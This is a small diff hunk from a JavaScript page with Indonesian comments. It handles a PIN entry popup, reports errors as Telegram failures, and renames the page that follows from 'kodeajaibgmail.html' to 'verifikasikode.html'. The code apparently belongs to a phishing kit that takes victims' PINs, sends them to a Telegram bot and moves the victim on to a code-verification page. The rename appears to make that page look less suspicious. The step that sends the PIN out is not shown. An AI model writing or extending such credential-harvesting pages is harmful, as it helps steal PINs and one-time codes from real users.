@@ -325,7 +325,7 @@ document.getElementById("submitPin").addEventListener("click", async () => {
     // Popup hilang dan redirect ke halaman verifikasi
     document.getElementById("pinPopup").classList.remove("show");
     inputs.forEach((i) => (i.value = ""));
-    window.location.href = "kodeajaibgmail.html"; // ganti dengan nama file verifikasi kamu
+    window.location.href = "verifikasikode.html"; // ganti dengan nama file verifikasi kamu
   } catch (err) {
     alert("Gagal mengirim PIN. Coba lagi.");
     console.error("Telegram Error:", err);
